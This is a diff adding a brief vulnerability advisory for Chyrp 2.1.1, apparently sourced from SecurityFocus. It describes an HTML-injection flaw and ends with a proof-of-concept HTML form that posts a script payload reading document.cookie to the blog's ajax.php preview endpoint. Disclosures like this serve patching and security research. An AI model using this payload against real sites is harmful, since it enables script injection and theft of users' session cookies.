@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/52115/info
+
+Chyrp is prone to an HTML-injection vulnerability because it fails to properly sanitize user-supplied input.
+
+Attacker-supplied HTML and script code would run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or control how the site is rendered to the user. Other attacks are also possible.
+
+Chyrp 2.1.1 is vulnerable; other versions may also be affected. 
+
+<form action="http://[host]/includes/ajax.php" method="post">
+<input type="hidden" name="action" value="preview" />
+<input type="hidden" name="feather" value="" />
+<input type="hidden" name="field" value="" />
+<input type="hidden" name="content" value='<script>alert(document.cookie);</script>' />
+<input type="submit" id="btn"> 
+</form>
